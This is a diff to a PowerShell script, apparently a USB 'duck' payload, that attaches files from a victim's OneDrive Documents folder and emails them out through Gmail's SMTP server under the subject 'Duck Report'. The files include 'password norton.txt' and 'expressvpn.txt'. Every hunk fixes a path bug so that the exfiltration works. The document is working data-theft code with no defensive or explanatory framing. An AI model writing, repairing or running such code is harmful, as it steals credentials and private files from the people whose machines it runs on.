@@ -7,7 +7,7 @@ $ReportEmail.From = 'duckysys@gmail.com'
 $ReportEmail.To.Add('duckysys@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$$($env:USERPROFILE)\OneDrive\Documents\expressvpn.txt"
+$files="$($env:USERPROFILE)\OneDrive\Documents\expressvpn.txt"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
 $SMTPServer = 'smtp.gmail.com'
@@ -19,7 +19,7 @@ $ReportEmail.From = 'duckysys@gmail.com'
 $ReportEmail.To.Add('duckysys@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$$($env:USERPROFILE)\OneDrive\Documents\extinction automatique.txt"
+$files="$($env:USERPROFILE)\OneDrive\Documents\extinction automatique.txt"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
 $SMTPServer = 'smtp.gmail.com'
@@ -31,7 +31,7 @@ $ReportEmail.From = 'duckysys@gmail.com'
 $ReportEmail.To.Add('duckysys@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$$($env:USERPROFILE)\OneDrive\Documents\malistedefichier2.txt"
+$files="$($env:USERPROFILE)\OneDrive\Documents\malistedefichier2.txt"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
 $SMTPServer = 'smtp.gmail.com'
@@ -43,7 +43,7 @@ $ReportEmail.From = 'duckysys@gmail.com'
 $ReportEmail.To.Add('duckysys@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$$($env:USERPROFILE)\OneDrive\Documents\password norton.txt"
+$files="$($env:USERPROFILE)\OneDrive\Documents\password norton.txt"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
 $SMTPServer = 'smtp.gmail.com'
@@ -55,7 +55,7 @@ $ReportEmail.From = 'duckysys@gmail.com'
 $ReportEmail.To.Add('duckysys@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$$($env:USERPROFILE)\OneDrive\Documents\son.txt"
+$files="$($env:USERPROFILE)\OneDrive\Documents\son.txt"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
 $SMTPServer = 'smtp.gmail.com'
@@ -67,7 +67,7 @@ $ReportEmail.From = 'duckysys@gmail.com'
 $ReportEmail.To.Add('duckysys@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$$($env:USERPROFILE)\OneDrive\Documents\mise en veille.lnk"
+$files="$($env:USERPROFILE)\OneDrive\Documents\mise en veille.lnk"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
 $SMTPServer = 'smtp.gmail.com'
@@ -79,7 +79,7 @@ $ReportEmail.From = 'duckysys@gmail.com'
 $ReportEmail.To.Add('duckysys@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$$($env:USERPROFILE)\OneDrive\Documents\Liste radio.ods"
+$files="$($env:USERPROFILE)\OneDrive\Documents\Liste radio.ods"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
 $SMTPServer = 'smtp.gmail.com'
@@ -91,7 +91,7 @@ $ReportEmail.From = 'duckysys@gmail.com'
 $ReportEmail.To.Add('duckysys@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$$($env:USERPROFILE)\OneDrive\Documents\lancement emulateur google tv.txt"
+$files="$($env:USERPROFILE)\OneDrive\Documents\lancement emulateur google tv.txt"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
 $SMTPServer = 'smtp.gmail.com'
@@ -103,7 +103,7 @@ $ReportEmail.From = 'duckysys@gmail.com'
 $ReportEmail.To.Add('duckysys@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$$($env:USERPROFILE)\OneDrive\Documents\intercalaire.odt"
+$files="$($env:USERPROFILE)\OneDrive\Documents\intercalaire.odt"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
 $SMTPServer = 'smtp.gmail.com'
@@ -115,6 +115,6 @@ $ReportEmail.From = 'duckysys@gmail.com'
 $ReportEmail.To.Add('duckysys@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$$($env:USERPROFILE)\OneDrive\Documents\intercalaire.odt"
+$files="$($env:USERPROFILE)\OneDrive\Documents\intercalaire.odt"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
